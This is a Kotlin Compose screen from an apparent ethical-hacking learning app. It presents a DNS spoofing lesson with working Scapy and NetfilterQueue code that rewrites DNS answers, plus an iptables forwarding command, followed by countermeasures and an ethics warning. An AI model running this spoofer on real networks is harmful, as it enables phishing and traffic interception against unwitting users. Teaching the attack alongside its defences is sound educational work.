package com.example.hackwithpython.projects

import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.BasicText
import androidx.compose.foundation.text.selection.SelectionContainer
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Text
import androidx.compose.material3.Button
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController
import com.example.hackwithpython.HackerWhite

@Composable
fun Project6Screen(navController: NavController) {
    Column(modifier = Modifier
        .padding(16.dp)
        .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.Top,
        horizontalAlignment = Alignment.Start) {
        Text(
            text = "Project 6: DNS Spoofing",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Project Introduction
        Text(
            text = """
                In this project, you will learn how to create a DNS spoofing tool that manipulates DNS responses 
                to redirect traffic to a different destination. DNS spoofing can be used for various purposes, including 
                phishing attacks and traffic redirection. We will also discuss countermeasures to prevent DNS spoofing attacks.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Tools and Libraries Section
        Text(
            text = "Tools and Libraries",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                - **Scapy**: A Python library used to craft and manipulate network packets, including DNS packets.
                - **NetfilterQueue**: A library that allows you to intercept packets and modify them.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Steps Section
        Text(
            text = "Steps",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Install Required Libraries:
                   Install `scapy` and `netfilterqueue` via pip.
                   ```bash
                   pip install scapy netfilterqueue
                   ```
                   """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp))

            SelectionContainer {
                BasicText("""
                   #Intercepting DNS Packets
                   #Use `netfilterqueue` to capture packets in real time.
                   from netfilterqueue import NetfilterQueue
                   import scapy.all as scapy

                   def process_packet(packet):
                       scapy_packet = scapy.IP(packet.get_payload())
                       if scapy_packet.haslayer(scapy.DNSRR):
                           print(scapy_packet.show())
                       packet.accept()

                   queue = NetfilterQueue()
                   queue.bind(0, process_packet)
                   queue.run()
                   
                   #Modify the DNS response to redirect traffic.
                   def process_packet(packet):
                       scapy_packet = scapy.IP(packet.get_payload())
                       if scapy_packet.haslayer(scapy.DNSRR):
                           qname = scapy_packet[scapy.DNSQR].qname
                           if "example.com" in qname.decode():
                               print(f"Intercepted request for {qname}")
                               spoofed_response = scapy.DNSRR(rrname=qname, rdata="192.168.1.100")
                               scapy_packet[scapy.DNS].an = spoofed_response
                               scapy_packet[scapy.DNS].ancount = 1
                               del scapy_packet[scapy.IP].len
                               del scapy_packet[scapy.IP].chksum
                               del scapy_packet[scapy.UDP].len
                               del scapy_packet[scapy.UDP].chksum
                               packet.set_payload(bytes(scapy_packet))
                       packet.accept()
                """.trimIndent(),

                style = TextStyle(
                    fontFamily = FontFamily.Monospace,
                    fontSize = 14.sp,
                    color = HackerWhite
                ),
                modifier =Modifier.padding(12.dp)
                    .horizontalScroll(rememberScrollState())
                )
                }

            Text(
                text = """
               Setting Up IP Tables (Linux):
                   To forward packets to the netfilter queue, set up IP tables.
                   ```bash
                   sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
                   ```

               Testing the DNS Spoofing:
                   Open a web browser and navigate to "example.com". It should now be redirected to the IP address you specified in the spoofed response.

               Countermeasures Against DNS Spoofing:
                   - Use DNSSEC (DNS Security Extensions) to verify the integrity of DNS responses.
                   - Implement firewalls and intrusion detection systems (IDS) to monitor and prevent DNS spoofing attacks.
                   - Use encrypted DNS protocols like DNS over HTTPS (DoH) or DNS over TLS (DoT) to secure DNS queries.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Ethical Considerations Section
        Text(
            text = "Ethical Considerations",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                DNS spoofing is a serious attack that can be used for malicious purposes such as phishing, man-in-the-middle attacks, and traffic interception. 
                Always use this tool responsibly and with explicit permission in a controlled environment. 
                It is illegal to perform DNS spoofing on public networks without proper authorization.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Conclusion
        Text(
            text = "Conclusion",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                In this project, you learned how to create a DNS spoofing tool using Python and Scapy, 
                as well as the countermeasures that can be used to prevent such attacks. Always remember to use this knowledge 
                ethically and for educational purposes.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate to the next project
        Row {
        Button(onClick = {navController.navigate("projects")},
            modifier = Modifier.padding(16.dp)){
            Text(text = "Home")
        }
        Button(onClick = {navController.navigate("project7")},
            modifier = Modifier.padding(16.dp)) {
            Text(text = "Next Lesson")
            }
        }
    }
}
